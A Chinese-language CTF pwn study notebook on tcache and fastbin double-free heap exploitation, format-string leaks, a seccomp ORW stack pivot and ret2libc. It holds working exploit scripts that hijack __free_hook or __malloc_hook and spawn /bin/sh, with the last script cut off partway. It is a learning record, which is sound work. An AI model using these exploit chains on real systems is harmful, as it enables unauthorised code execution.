![image-20261106183252670](assets/image-20261106183252670.png)

这次看到变成200，或许这就是计数器

那后下面那个存的是这个堆块大小的头指针

![image-20261106183827595](assets/image-20261106183827595.png)

这次申请3个大小不同的堆块释放进入tcachebin中

![image-20261106184047058](assets/image-20261106184047058.png)

在这里或许可以看清counts数组,然后就是tcache指针存储情况

哦哦，也就是泄露这个起始地址之后再次修改其connts数量，之后再次释放堆块就可以进入unsortedbin了

所以说修改tcashebin的fd指针就是到开头

![image-20261106190338685](assets/image-20261106190338685.png)

地址接收完毕

修改地址怎么传？

![image-20261106191350577](assets/image-20261106191350577.png)

这个，额

fd指针指向的就是，将要分配的地址

所以应该是-250这样才会到想要修改的哪里

![image-20261106192237928](assets/image-20261106192237928.png)

但是仔细看这里，edit函数的read函数，这里可以看到，S_1已经被清零了，所以说这一步只能得到堆块起始地址

所以后续还需要再次申请堆块进行，修改得到起始堆块

我去了，你倒是神请相同大小的堆块进行修改啊，之后申请两次之后，就可以得到counts数组所在的地址，之后进行修改就可以

![image-20261107151321639](assets/image-20261107151321639.png)

可以看到已经修改为我们想要的地址了，010

之后只需要申请两次就可以得到想要修改的地址

![image-20261107151441731](assets/image-20261107151441731.png)

![image-20261107151720033](assets/image-20261107151720033.png)

这就是修改完之后的

之后释放一个相同大小的堆块，就会进入unsortedbin

![image-20261107152549716](assets/image-20261107152549716.png)

这里想的就是或许就只是将那一行填充为大于7的就可以，可是释放完之后还是进入的是fastbin

![image-20261107170445013](assets/image-20261107170445013.png)

这次改的应该可以

8

![image-20261107172012510](assets/image-20261107172012510.png)

这个蛮有意思，确实是从0x20开始计算数组的

之后确实是填满了

![image-20261107172604231](assets/image-20261107172604231.png)

果然还是需要隔离起来吗，这样才能进入unsortedbin

这里确实，就是你在申请的时候还是需要满足大小的，像是这样释放一个小块，之后进入的就是fasbin

![image-20261107173116537](assets/image-20261107173116537.png)

泄露成功

之后计算出基址就可以

那么就收集一下

![image-20261109192026178](assets/image-20261109192026178.png)

![image-20261109192709519](assets/image-20261109192709519.png)

这样的话就可以得到先关地址

![image-20261109201353966](assets/image-20261109201353966.png)

找附近满足的堆块

![image-20261109201727924](assets/image-20261109201727924.png)

不是正确地址

![image-20261109201801136](assets/image-20261109201801136.png)

这样写有问题

![image-20261109202652235](assets/image-20261109202652235.png)

这里之前就有unsortedbin 之后的话就直接从这里面切割了

![image-20261109203223322](assets/image-20261109203223322.png)

写进去了

![image-20261109203319631](assets/image-20261109203319631.png)

满足堆块大小条件，之后呢？

![image-20261109205906001](assets/image-20261109205906001.png)

两个挨在一起

到目前为止，已经找到相关的函数地址，

只是差一个double free 将这个写入并且修改可是之后7个堆块，我已经弄完了，无法接着添加

还有那个堆风水吗？难道就是需要满足onegadget的条件吗？

神了

# ciscn_2019_final_3

[ciscn2019_final_3 writeup | xia0ji233's blog](https://xia0ji233.pro/2021/11/01/ciscn2019_final_3 writeup/)

[ciscn_2019_final_3 需要避开当前free的chunk的下一个chunk不能超过arena的边界 - PYozo_free - 博客园](https://www.cnblogs.com/pppyyyzzz/p/14040210.html)

![image-20261111162627147](assets/image-20261111162627147.png)

啥意思？

![image-20261111163710390](assets/image-20261111163710390.png)



















这道题还是用来巩固tcache机制

只有两个功能，一个add 一个remove

![image-20261110181432908](assets/image-20261110181432908.png)

![image-20261110181956571](assets/image-20261110181956571.png)

并没有进行指针清零

uaf

检查保护

![image-20261110182057997](assets/image-20261110182057997.png)

依旧全开，需要泄露libc地址

可是add函数限制了大小

![image-20261110182900882](assets/image-20261110182900882.png)

他这里给的礼物是堆地址

![image-20261110182940808](assets/image-20261110182940808.png)

还有tcachebin

```bash
patchelf --set-interpreter /home/nan/桌面/pwn/2.27-3ubuntu1_amd64/ld-2.27.so ./pwn
patchelf --set-rpath /home/nan/桌面/pwn/2.27-3ubuntu1_amd64 ./pwn
```

忘了修改了

上一题是可以修改counts数组里面的值，然后申请大块进而释放

可是这个限制大小就只是0x80

那就去修改一个chunk的size域

![image-20261110190608335](assets/image-20261110190608335.png)

怎么修改size?没有溢出

那就把指针改到size字段哪个位置，之后的话，直接申请在修改

![image-20261110193416890](assets/image-20261110193416890.png)

首先这个地址接受的是字符串，之后转化一下

![image-20261110193801495](assets/image-20261110193801495.png)

及诶收好了，就是需要  int（p.recvline().strip(),16）

![image-20261110193934309](assets/image-20261110193934309.png)

连续释放两次之后

![image-20261110194223082](assets/image-20261110194223082.png)

修改到了chunk的开头，接下来继续申请

![image-20261110194858195](assets/image-20261110194858195.png)

连续申请并且修改其size字段

![image-20261110195156131](assets/image-20261110195156131.png)

可是还是没有绕过tcache机制们这里其实也可以修改其数量

原来还可以直接修改成超级大块，0x410

![image-20261110195759522](assets/image-20261110195759522.png)

妈的，偶改错了

![image-20261110195821351](assets/image-20261110195821351.png)

![image-20261110195936023](assets/image-20261110195936023.png)

哎呀，我去，doublefree的提示

没有在后面伪造块结构

那还不如直接修改大管家

![image-20261110200646023](assets/image-20261110200646023.png)







这一次，先修改的size大小

![image-20261110210233796](assets/image-20261110210233796.png)

接着修改大管家

妈的，改个但

第一次

```python
add(4,0x30,b'a')
p.recvuntil(b'gift :')
addr1=int(p.recvline().strip(),16)
print(addr1)
addr2=addr1-0x10
delete(4)

delete(4)

add(5,0x30,p64(addr2))
add(6,0x30,b'b')
add(7,0x30,p64(0)+p64(0x90))



add(0,0x50,b'a')
p.recvuntil(b'gift :')
addr=int(p.recvline().strip(),16)
print(addr)
heap_addr=addr-0x11eb0+0x10

delete(0)
delete(0)

add(1,0x50,p64(heap_addr))
add(2,0x50,b'b')
add(3,0x50,b'q'*0x10)

add(8,0x50,b'c')
```

写的啥，我刷哦罢了

## 复现别人exp

```python
from pwn import *

context.log_level='debug'
context.arch='amd64'
context.os='linux'
def conn(x,file_name,port):
    if x:
        p=process(file_name)
        libc=ELF('./libc/libc-2.27-64.so')
    else:
        p=remote('node4.buuoj.cn',port)
        libc=ELF('./libc/libc-2.27-buu64.so')
    return ELF(file_name),libc,p

def add(index,size,payload):
    p.sendlineafter(b'choice >',b'1')
    p.sendlineafter(b'index',str(index))
    p.sendlineafter(b'size',str(size))
    p.sendafter(b'something',payload)
    if index==11:return 
    p.recvuntil(b'0x')
    #if index==11:gdb.attach(p)
    return int(p.recvline()[:-1],16)

def free(index):
    p.sendlineafter(b'choice >',b'2')
    p.sendlineafter(b'index',str(index))

elf,libc,p=conn(0,'./ciscn_final_3',28019)
heap_addr=add(0,0x18,b'a'*0x8+p64(0))
free(0)
success('heap_addr:'+hex(heap_addr))
free(0)
#double free保存一个free的0x30堆块在0号堆块位置
add(1,0x18,p64(heap_addr-0x10))
add(2,0x18,b'/bin/sh\0')
add(3,0x18,b'\0'*8+p64(0x31))
free(0)
#free(0)

add(4,0x78,b'a'*0x78)
free(4)
free(4)
add(5,0x78,p64(heap_addr-0x10))
add(6,0x78,b'a')
add(7,0x78,p64(0)+p64(0xa1))#构造非fastbin大小的堆块
add(8,0x38,b'a')

for i in range(8):#填满tcache 使其落入unsorted bin
    free(0)
add(9,0x28,b'aa')
libc_addr=add(10,0x28,b'\0')-0x3ebca0#泄露libc地址
success('libc_addr:'+hex(libc_addr))

add(11,0x60,b'a')
free(11)
free(11)
add(12,0x60,p64(libc_addr+libc.sym['__free_hook']))#劫持freehook
add(13,0x60,b'a')
add(14,0x60,p64(libc_addr+libc.sym['system']))
add(15,0x18,b'/bin/sh\0')
free(15)#getshell
#gdb.attach(p)
p.interactive()
```

首先就是申请一个0x18看到的话就是0x20大小的堆块，然后

之后的话就是直接，double好像是保存了字符串还有又重新更改了一开始堆块的size字段

![image-20261111095531207](assets/image-20261111095531207.png)

一开始的doublefree

![image-20261111095621400](assets/image-20261111095621400.png)

![image-20261111095808122](assets/image-20261111095808122.png)

![image-20261111100151181](assets/image-20261111100151181.png)

这里已经进入到了doublfree的尾声，之后就直接修改堆块的size字段

![image-20261111100255823](assets/image-20261111100255823.png)

![image-20261111100410368](assets/image-20261111100410368.png)

这个就是修改完之后的

接下来free0?有什么用？

![image-20261111100642649](assets/image-20261111100642649.png)

这里的free0确实是把一开始的chunkfree掉了，或许就是因为

freeeeeeeeeeee

![image-20261111101237121](assets/image-20261111101237121.png)

![image-20261111101342496](assets/image-20261111101342496.png)

在这里确实是把它放进了0x30大小的堆块

接下来构造非fastbin大小的堆块

申请的是0x78大小的，也是限制最大的堆块

![image-20261111101751566](assets/image-20261111101751566.png)

不知从何时开始topchunk就没有了

居然是直接从98开始写的吗？

如果只是想将这个大堆块写入的话，那么成功了，也是double free

我靠，接下来是？直接到原来的堆块？

首先应该还是修改的是0x80大小的tcachebin链

![image-20261111103351892](assets/image-20261111103351892.png)

一开始是这样的

![image-20261111103505936](assets/image-20261111103505936.png)

在这里又是改成了60堆块

接下来就是修改size大小。

改的还是一开始那个改成0x30大小的堆块

？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？

![image-20261111103955795](assets/image-20261111103955795.png)

啥意思？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？

![image-20261111104528864](assets/image-20261111104528864.png)

之后又申请了一个0x40大小的堆块

然后现在就是已经把堆块大小改完了，还有

![image-20261111105238903](assets/image-20261111105238903.png)

怎么就突然释放进unsoretdbin了

![image-20261111105438336](assets/image-20261111105438336.png)

然后直接申请两个满足0x30大小的堆块，就可以得到Libc地址

![image-20261111110043008](assets/image-20261111110043008.png)

我靠，什么？

![image-20261111110606429](assets/image-20261111110606429.png)

难道这样可以直接读到bk指向的位置吗？？？？？？？？

MLB ,啥是堆风水，靠

最重要的没看懂，后面的就是再次doublefree 然后劫持free_hook,修改成system之后还有一开始写入的字符串，这样就

![image-20261111111138027](assets/image-20261111111138027.png)

这个版本通了，神了





## 第三次

![image-20261111170114923](assets/image-20261111170114923.png)

在这里确实是看到了复用机制

free unosretdbin大小堆块的机制

![image-20261111170658519](assets/image-20261111170658519.png)

所以在修改size之前是先创建了两个在其范围内的堆块

所以说这就是伪造堆块重叠，构造大堆块修改其size字段，之后，释放进入unsortedbin

![image-20261111171515245](assets/image-20261111171515245.png)

就像是这样

之后再添加一个堆块，防止合并在释放的时候

![image-20261111171824328](assets/image-20261111171824328.png)

在这里想添加一个0x18堆块失败

![image-20261111172011819](assets/image-20261111172011819.png)

添加一个0x30

之后应该就可以释放了

![image-20261111172148517](assets/image-20261111172148517.png)

free的时候没有报错

![image-20261111172311325](assets/image-20261111172311325.png)

接下来连续free8次之后，然后就进入unsoretdbin中了

那么接下来怎么泄露libc？

![image-20261111173323481](assets/image-20261111173323481.png)

这里free现在unsoretdbin中的0x80大小的堆块两次

效果：

![image-20261111173419392](assets/image-20261111173419392.png)

在一开始创建的时候犯了个错，

![image-20261111174903656](assets/image-20261111174903656.png)

之后回来再看，然后改完这个就可以了

![image-20261111174952499](assets/image-20261111174952499.png)

再连续申请两次就可以







## 第四次

首先创建4个0x60堆块，然后释放

![image-20261112184055300](assets/image-20261112184055300.png)

然后呢，就只是释放到了tcachebin中

接着又重新创建一个0x60大小堆块，接受堆地址

![image-20261112184445686](assets/image-20261112184445686.png)

![image-20261112184646033](assets/image-20261112184646033.png)

新获得的堆块地址距离堆块开头距离

它的开头又一个大小是0x250大小的堆块

然后又是删除chunk0两次

![image-20261112185339214](assets/image-20261112185339214.png)

这个只是删除一次之后

可是接下来删除第二次之后

![image-20261112185555454](assets/image-20261112185555454.png)

居然tcache链表中就只是剩下了70的链，其他的呢？

接下来申请一个0x60大小的，大小的利用其double free漏洞，修改其fd指针，指向堆的开头

![image-20261112190309214](assets/image-20261112190309214.png)

接下来就是修改其counts数组

```python
add(6,0x60,b'a')
payload=b'\x00'*0x20+b'\x07'*(64-0x20)+p64(heap+0x40)
add(7,0x60,payload)
```

连续申请，之后的话就直接

![image-20261112193209266](assets/image-20261112193209266.png)

可是那个payload到底干了什么？

这是payload没有写入之前，然后写入查看

![image-20261112193637327](assets/image-20261112193637327.png)

counts数组后面紧跟的就是entry数组

而且是tcache[0x20]的链表头

然后呢，改这里有什么用？

然后又把这个堆块删了

![image-20261112194124275](assets/image-20261112194124275.png)

啥情况啊？

![image-20261112194335050](assets/image-20261112194335050.png)

这个251是一开始就有的，之后的话如果是想的是想要释放相应大小的堆块的话，之后填充7的话，还是理解的，可是之后的，修改emtrys的数组改为40是干啥？

依旧unsoretdbin的切割

# 接收地址

![image-20261118144631002](assets/image-20261118144631002.png)

下面的一行就是程序输出的内容接下来接收

![image-20261118144831313](assets/image-20261118144831313.png)

Int（x,16）

将接收的字符串转化为整数

![image-20261118145953395](assets/image-20261118145953395.png)

接受代码块:

将接受安空格分开，之后再int(x,16)转化

```python
parts=p.recvline().split()
canary=int(parts[0],16)
stack=int(parts[1],16)
laddr=int(parts[2],16)
```













# 挑战赛

## 1.余像（canary+栈上格式化字符串）

有点晕啊今晚，那就照着ai一步一步

调试

其实已经就是知道栈上泄露的是第六个位置的数据了，之后想要泄露Libc什么的死活泄露不出阿来

![image-20261116205450655](assets/image-20261116205450655.png)

然后就是保护全开之后，检查沙箱保护的话，说实话一开始并不知道，所以也更不可能知道是orw了，

原来的调试脚本

```python
from pwn import*
p=process('./pwn')
e=ELF('./pwn')
ARCH = 'amd64'
context(arch=ARCH, os='linux', log_level='debug')
offset = 6
gdb.attach(p)

puts_got=e.got['puts']
payload=p64(puts_got)+b'%6$s'
p.recvuntil(b">")
p.sendline(b'1')

p.recvuntil(b'format:\n')
p.sendline(payload)
pause()

p.interactive()
```

![image-20261116210001182](assets/image-20261116210001182.png)

![image-20261116210112189](assets/image-20261116210112189.png)

所以还是问号

首先在程序的检查上面就已经出现了问题，他那个有个函数其实就已经告诉开启了沙箱

![image-20261116213042843](assets/image-20261116213042843.png)

就是这个函数。

![image-20261116205450655](assets/image-20261116205450655.png)

![image-20261116213640607](assets/image-20261116213640607.png)

所以从那一个图里面就知道execve和open的话，那么就可以用openat代替open函数

那就从最简单的开始，就是栈溢出偏移大小，以及漏洞函数入口

![image-20261118095208832](assets/image-20261118095208832.png)

![image-20261118095228117](assets/image-20261118095228117.png)

![image-20261118095317029](assets/image-20261118095317029.png)

可以从上面的preview来格式化字符串

![image-20261118095409190](assets/image-20261118095409190.png)

![image-20261118095846177](assets/image-20261118095846177.png)

居然是从一开始，就把存入的数组看错了

所以偏移就是（0x90+0x8）

之后要做的就是通过格式化字符串泄露数据

可是pie也开了，所以要泄露Libc和canary

你就算出偏移之后再转成10进制，除以8 之后加上6

![image-20261118101233209](assets/image-20261118101233209.png)

23，这个就是canary的地址

![image-20261118102055022](assets/image-20261118102055022.png)

这里也是在canary下断点可是却没有停在漏洞点

因为前面也有调用printf函数的地方

所以应该因为开启了pie所以，直接

b *base+0x155f

又错了

![image-20261118102449234](assets/image-20261118102449234.png)

应该是15ba

又错

```gdb
b *($base+0x15ba)
```



info proc mappings 先运行起来，之后的话直接加上偏移

![image-20261118104347710](assets/image-20261118104347710.png)

0x11+6=23

![image-20261118105255886](assets/image-20261118105255886.png)



这三个依次是canary 栈地址 Libc地址

可是为什么要泄露这三个地址？

泄露canary是因为栈溢出需要

之后呢？栈地址？libc地址是因为开启了pie。栈地址呢，泄露它干什么？

错了

canary是对的

可是后面的栈地址是因为后面要用orw来读取flag到一个地址 这里是因为开启了pie

之后泄露libc是因为alsr

![image-20261118110418944](assets/image-20261118110418944.png)

这几个依次是canary 栈地址 libc相关地址

然后依次计算相关基址，以及bss地址

![image-20261118151211545](assets/image-20261118151211545.png)

![image-20261118151227265](assets/image-20261118151227265.png)

bss段地址用 IDA 看（Shift+F7 或直接看全局变量地址，

![image-20261118151654816](assets/image-20261118151654816.png)

接下来只需要程序基地址加上就可以

bss段作用：

作为read函数写入flag的地址

怎么选？

gdb里面可以看相关的页权限

![image-20261118152810523](assets/image-20261118152810523.png)

这里+0x4000的就是可以写的

然后

![image-20261118153249588](assets/image-20261118153249588.png)

现在就只是往后+100是空白的，所以往里面去写

接下来就是向里面去触发漏洞函数，写入Paylaod

但是调用orw,还是要首先知道相关函数以及相关指令的

怎么找？

因该是可以直接在虚拟机中用ROPgadget --binary指令去寻找的

![image-20261118185446384](assets/image-20261118185446384.png)

但是其实这里的write函数是限制read的读入大小的

所以原来的链放在这里其实是放不下的

所以需要栈迁移



更改版本连接器

接下来就是构造chain了

![image-20261120162037048](assets/image-20261120162037048.png)

可是难道就是这样一个一个找吗？

```python
rop = ROP(libc)

```

glibc-all-in-one用法

![image-20261120164755741](assets/image-20261120164755741.png)

进入到这个页面，之后可以运行一下更新脚本

之后可以downloadlist中的版本

![image-20261120165136551](assets/image-20261120165136551.png)

下完之后我放在同一个目录下

```
cp 2.35-0ubuntu3_amd64/libc-2..so ./libc.so.6
cp 2.27-3ubuntu1.6_amd64/ld-2.35.so ./ld-2.35.so
cp 2.27-3ubuntu1.6_amd64/ld-2.27.so ./ld-2.27.so
```

```
patchelf --set-interpreter ./ld-2.27.so ./pwn
patchelf --set-rpath . ./pwn
```

换来连接器

他需要的是2.34

```
cp 2.35-0ubuntu3_amd64/libc.so.6 ./libc.so.6
cp 2.35-0ubuntu3_amd64/ld-linux-x86-64.so.2 ./ld-2.35.so
```

```python
patchelf --set-interpreter ./ld-2.35.so ./pwn
patchelf --set-rpath . ./pwn
```



接着让pwntools自己寻找相关的gadget

```
rop=ROP('./libc.so.6')
```

还有

```python
libc.address=libc_base

```





























## 2.note

```bash
cd ~/桌面/tiaozhan

# 1. 补执行权限（之前报"权限不够"就是因为 ld 没有执行位）
chmod +x note ld-2.23.so

# 2. 让 libc.so.6 这个名字指向真正的 2.23
ln -sf libc-2.23.so libc.so.6

# 3. interpreter 和 rpath 都用绝对路径，稳妥
patchelf --set-interpreter "$HOME/桌面/tiaozhan/ld-2.23.so" \
         --set-rpath "$HOME/桌面/tiaozhan" note

# 4. 验证
ldd note
./note
```

### ld-2.23.so —— 动态链接器（加载器）

二进制运行过程：

1. 内核读 note 文件头，发现里面写着：
   "我的解释器（interpreter）是 ./ld-2.23.so"     ← 这就是 PT_INTERP 段
2. 内核先把 ld-2.23.so 加载进内存，把控制权交给它
3. ld 接管后开始干活：
   - 读取 note 的依赖清单（"我需要 libc.so.6"）
   - 按搜索路径找到 libc-2.23.so，加载进内存
   - 修补所有函数地址（重定位）
   - 一切就绪后，才跳到 note 的 main 函数开始执行

![image-20261115200711531](assets/image-20261115200711531.png)

#### 接收与计算地址

```bash
nan@nan-virtual-machine:~/桌面/tiaozhan$ one_gadget ./libc.so.6 
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

```

![image-20261115212534320](assets/image-20261115212534320.png)

![image-20261115213555334](assets/image-20261115213555334.png)

fastbin申请

前面的链表地址到底这是不是可以申请完之后写入的地址

![image-20261115214041136](assets/image-20261115214041136.png)

![image-20261116164357102](assets/image-20261116164357102.png)

0x7f

成功脚本

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
p = process('./note')          # 远程换 remote(ip, port)
libc = ELF('./libc-2.23.so')

def add(size, content):
    p.recvuntil(b'cmd>')
    p.sendline(b'1')
    p.recvuntil(b'size>')
    p.sendline(str(size).encode())
    p.recvuntil(b'data> ')
    p.send(content.ljust(size, b'\x00'))    # 补满，避免 read 阻塞

def free(idx):
    p.recvuntil(b'cmd>'); p.sendline(b'4')
    p.recvuntil(b'index>'); p.sendline(str(idx).encode())

def show(idx):
    p.recvuntil(b'cmd>'); p.sendline(b'3')
    p.recvuntil(b'index>'); p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    return p.recv(6)

def edit(idx, content):
    p.recvuntil(b'cmd>'); p.sendline(b'2')      # 注意：原脚本是 b'cmd> '，多了空格
    p.recvuntil(b'index>'); p.sendline(str(idx).encode())
    p.recvuntil(b'data> ')
    p.send(content)

# ---------- 1. 泄漏 libc ----------
add(0x80, b'a' * 0x80)     # idx0 -> unsorted bin
add(0x68, b'b' * 0x68)     # idx1 -> 0x70 fastbin  ★改
add(0x68, b'c' * 0x68)     # idx2                ★改
free(0)
leak = u64(show(0).ljust(8, b'\x00'))
libc_base = leak - 0x3c4b78          # glibc2.23 main_arena+88
libc.address = libc_base
log.success('libc_base = %#x' % libc_base)

malloc_hook = libc.sym['__malloc_hook']
system      = libc.sym['system']
bash        = next(libc.search(b'/bin/sh\x00'))
# one_gadget ./libc-2.23.so 逐个试（2.23 常见 4 个）
one_gadget  = libc_base +0xf1247
log.info('malloc_hook=%#x system=%#x bash=%#x' % (malloc_hook, system, bash))

# ---------- 2. fastbin dup: 1 -> 2 -> 1 ----------
free(1)
free(2)
free(1)

# ---------- 3. 改写 fastbin 链表 ----------
fake = malloc_hook - 0x23          # 该处 0x7f 可当 0x70 bin 的合法 size
add(0x68, p64(fake))               # ① 取回 chunk1，content 前8字节 = 新 fd
add(0x68, b'x')                    # ② 取回 chunk2
add(0x68, b'x')                    # ③ 取回 chunk1，head 变成 fake
# fake chunk 的 user data = malloc_hook - 0x13，填 0x13 字节后正好写 __malloc_hook
payload = b'A' * 0x13 + p64(one_gadget)
add(0x68, payload)                 # ④ 分配到 fake，覆盖 __malloc_hook

# ---------- 4. 触发 ----------
# 任意一次 malloc 都会先调用 __malloc_hook
p.recvuntil(b'cmd>')
p.sendline(b'1')
p.sendline(b'16')
p.interactive()
```

![image-20261116170450485](assets/image-20261116170450485.png)

这是一开始创建的堆的结构图

两个0x68

![image-20261116170943757](assets/image-20261116170943757.png)





































不行：

```python
from pwn import*
p=process('./note')
#gdb.attach(p)
libc=ELF('./libc-2.23.so')
context.log_level='debug'
def add(size, content):
    p.recvuntil(b'cmd>')
    p.sendline(b'1')
    p.recvuntil(b'size>')
    p.sendline(str(size).encode())
    p.recvuntil(b'data> ')
    p.send(content)

def free(idx):
    p.recvuntil(b'cmd>')
    p.sendline(b'4')
    p.recvuntil(b'index>')
    p.sendline(str(idx).encode())

def show(idx):
    p.recvuntil(b'cmd>')
    p.sendline(b'3')
    p.recvuntil(b'index>')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    
    

def edit(idx, content):
    p.recvuntil(b'cmd> ')
    p.sendline(b'2')
    p.recvuntil(b'index>')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data> ')
    p.send(content)
    
gdb.attach(p)
add(0x80,b'a'*0x80)
add(0x68,b'b'*0x68)
add(0x68,b'c'*0x68)
free(0)
show(0)
addr=(p.recv(6).ljust(8,b'\x00'))
print(u64(addr))
libc_base=u64(addr)-0x3c4b78
free(1)
free(2)
free(1)
malloc_hook=libc_base+libc.symbols['__malloc_hook']
system=libc_base+libc.symbols['system']
bash=libc_base+next(libc.search(b'/bin/sh\x00'))
print(malloc_hook)
print(system)
print(bash)
#add(0x60,p64(0).ljust(0x60,b'a'))
target = malloc_hook - 0x23
add(0x60, p64(target).ljust(0x60, b'\x00')) 
#edit(0,p64(malloc_hook-0x13))

ogg=libc_base+0xf1247
add(0x60,b'a')
add(0x60,b'b')
add(0x60,p64(ogg))










#edit(2, b'\x00' * 0x13 + p64(ogg))
#add(0x60,b'a'*0x60)

#edit(4,b'a'*0x13+p64(ogg))


#add(0x10,b'a'*0x10)


pause()





p.interactive()

```

![image-20261116173637998](assets/image-20261116173637998.png)

这个版本卡在最后，因为可能又输入了内容，然后在接收的时候卡在这里了

### 3.纸库

还是首先更改文件的ld即是动态连接器加权限



















































# easy_ret2libc

2026鲲鹏杯

![image-20261120173444416](assets/image-20261120173444416.png)

![image-20261120173555332](assets/image-20261120173555332.png)

没有开什么保护

也是轻松溢出

但是没有system函数，所以还是泄露libc

```
0x000000000040101a : ret
0x000000000040117e : pop rdi ; ret

```

里面有puts函数

![image-20261120174520483](assets/image-20261120174520483.png)

![image-20261120174740541](assets/image-20261120174740541.png)

溢出大小：

0x20+0x8

![image-20261120175432477](assets/image-20261120175432477.png)

接收到地址

![image-20261120181505043](assets/image-20261120181505043.png)

脚本

```python
from pwn import *
context.log_level = 'debug'
libc = ELF('./libc.so.6')
p =remote('nc1.ctfplus.cn',47628)
elf = ELF('./pwn')

ret = 0x40101a
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vlun = 0x401183
pop_rdi = 0x40117e

# ================= 第一次溢出：泄露 puts 真实地址 =================
pay = b'a' * 0x28
pay += p64(ret)       # 栈对齐
pay += p64(pop_rdi)   # 把 puts_got 传给 rdi
pay += p64(puts_got)
pay += p64(puts_plt)  # 调用 puts 打印地址
pay += p64(vlun)      # 返回漏洞函数，准备二次溢出

p.recvuntil(b'name: ')
p.sendline(pay)

# 接收泄露的地址（注意这里，用 recv(6) 最稳）
# 假设程序会打印一些废话，再打印地址。如果是直接打印，就直接 recv(6)
# 你可以根据实际输出情况修改 recvuntil 的字符串
p.recvuntil(b'you!\n') # 假设泄漏前有这句，如果没有请删掉
leak_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f"Puts Leak: {hex(leak_addr)}")

# ================= 计算 Libc 基址 =================
libc_base = leak_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

log.success(f"Libc Base: {hex(libc_base)}")
log.success(f"System: {hex(system_addr)}")
log.success(f"Binsh: {hex(binsh_addr)}")

# ================= 第二次溢出：执行 system("/bin/sh") =================
# 注意：此时缓冲区可能还有没接收干净的字符（比如换行符）。
# 我们直接发送 payload，如果是本地，send 后面加个 pause() 看看
payload = b'A' * 0x28
payload += p64(ret)       # 栈对齐
payload += p64(pop_rdi)   # 传参 /bin/sh
payload += p64(binsh_addr)
payload += p64(ret)       # 栈对齐（保证进入 system 时 RSP % 16 == 0）
payload += p64(system_addr)

# 确认一下是否真的回到了 name: 
# 如果卡住，可以直接尝试删掉这句 recvuntil
p.recvuntil(b'name: ') 
p.sendline(payload)

# 成功拿到 shell
p.interactive()
```

```python
from pwn import*
context.log_level='debug'
libc=ELF('./libc.so.6')
p=process('./pwn')
elf=ELF('./pwn')

ret=0x40101a
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
vlun=0x401183
pop_rdi=0x40117e
pay=b'a'*0x28+p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vlun)

p.recvuntil(b'name: ')
p.sendline(pay)
p.recvuntil(b'you!\n')
leak_addr = u64(p.recv(6).ljust(8, b'\x00')) 

libc_base = leak_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = b'A' * 0x28+p64(ret)
payload += p64(pop_rdi) 
payload += p64(binsh_addr)
payload += p64(ret)
payload += p64(system_addr)

p.recvuntil(b'name: ')
p.sendline(payload)


p.interactive()
```

别跟我说就只是少接受一个\n

直接给你完整exp

```python
# -*- coding: utf-8 -*-
"""
afterimage 最终 exp —— 栈迁移版（glibc 2.35）

为什么需要栈迁移：
  write() 是循环 read，累计上限 0x130 字节。从 ret addr(buf+0x98) 起只剩
  0x98=152 字节，放不下完整 orw 链(约 0x100+)。原来 0x198 的 payload 被截断。
  本脚本：栈上放短链 read(0,bss,0x400) 把长链读进 bss，再 leave;ret 迁过去。

要点：
  - saved rbp 覆盖成 BSS-8，配合程序自带的 leave;ret(0x127b) 迁移到 BSS
  - bss 用 0x4100（避开 0x4020/4030/4040 的 stdout/stdin/stderr 指针）
  - libc 基址：%15$p = puts+346，与版本无关
  - seccomp 禁 open/execve，orw 走 openat
"""
from pwn import *
import time

context(arch='amd64', os='linux', log_level='debug')

e = ELF('./pwn', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
p = process('./pwn')

PREVIEW_RET = 0x1768
LEAVE_RET   = 0x127b     # 程序自带 leave ; ret

def menu(c):
    p.recvuntil(b'> ')
    p.send(c)

def preview(fmt):
    menu(b'1\n')
    p.recvuntil(b'format:\n')
    p.send(fmt + b'\n')
    return p.recvuntil(b'\n', drop=True)

# ---------- 1. leak canary + PIE ----------
out = preview(b'%23$p.%25$p')
canary   = int(out.split(b'.')[0], 16)
pie_base = int(out.split(b'.')[1], 16) - PREVIEW_RET
log.success('pie_base = %#x' % pie_base)
assert pie_base & 0xfff == 0

# ---------- 2. leak libc：%15$p = puts+346 ----------
puts_ret = int(preview(b'%15$p'), 16)
libc_base = puts_ret - libc.sym['puts'] - 0x15a
log.success('libc_base = %#x' % libc_base)
assert libc_base & 0xfff == 0, 'libc_base 不对齐'

libc.address = libc_base
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
ret     = rop.find_gadget(['ret']).address
g = rop.find_gadget(['pop rdx', 'ret'])
if g:
    pop_rdx, extra = g.address, 0
else:
    g = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])
    assert g, '找不到 pop rdx'
    pop_rdx, extra = g.address, 1
log.info('pop_rdi=%#x pop_rsi=%#x pop_rdx=%#x extra=%d ret=%#x'
         % (pop_rdi, pop_rsi, pop_rdx, extra, ret))

def set_rdx(v):
    return p64(pop_rdx) + p64(v) + p64(0) * extra

BSS  = pie_base + 0x4100    # 阶段2 ROP 链
PATH = pie_base + 0x4200    # flag 路径
OUT  = pie_base + 0x4300    # flag 内容

